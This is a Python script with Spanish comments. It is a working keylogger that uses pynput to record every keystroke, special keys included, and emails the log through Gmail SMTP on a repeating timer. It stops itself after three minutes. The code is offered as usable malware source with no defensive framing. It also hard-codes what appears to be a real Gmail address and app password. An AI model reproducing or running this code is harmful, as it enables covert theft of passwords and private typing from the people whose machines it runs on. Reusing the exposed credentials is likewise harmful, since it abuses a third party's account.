import smtplib
from email.message import EmailMessage
from pynput import keyboard
import threading

# Configura tu cuenta de correo
EMAIL_ADDRESS = 'zabnercs@gmail.com'      # Cambia esto
EMAIL_PASSWORD = 'nwxx yjcpabjlaogt'      # Usa una clave de aplicación

log = ""

def enviar_email():
    global log
    if log:
        msg = EmailMessage()
        msg.set_content(log)
        msg['Subject'] = 'Escaneo de teclas'
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS  # Puedes enviártelo a ti mismo

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        log = ""  # Reinicia el log después de enviarlo

    # Repetir el envío cada 60 segundos
    threading.Timer(15, enviar_email).start()

def on_press(key):
    global log
    try:
        # Si es una tecla normal, agrega el carácter
        log += key.char
    except AttributeError:
        # Si es una tecla especial, maneja los casos
        if key == keyboard.Key.space:
            log += " "  # Añadir espacio
        elif key == keyboard.Key.enter:
            log += "\n"  # Nueva línea al presionar Enter
        elif key == keyboard.Key.tab:
            log += "\t"  # Tabulador
        elif key == keyboard.Key.backspace:
            log = log[:-6] if log.endswith("<BACK>") else log  # Eliminar <BACK> previos
            log += "<BACK>"  # Añadir retroceso
        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            pass  # Ignorar Shift (puedes personalizar esto si lo deseas)
        else:
            log += f"<{key.name.upper()}>"  # Añadir nombre de la tecla

# Función para detener el keylogger después de 3 minutos (180 segundos)
def stop_listener(listener):
    listener.stop()

# Inicia el envío de correos automáticos
enviar_email()

# Inicia el keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Detener el keylogger después de 3 minutos (180 segundos)
threading.Timer(180, stop_listener, [listener]).start()

# Mantiene el programa en ejecución mientras el listener está activo
listener.join()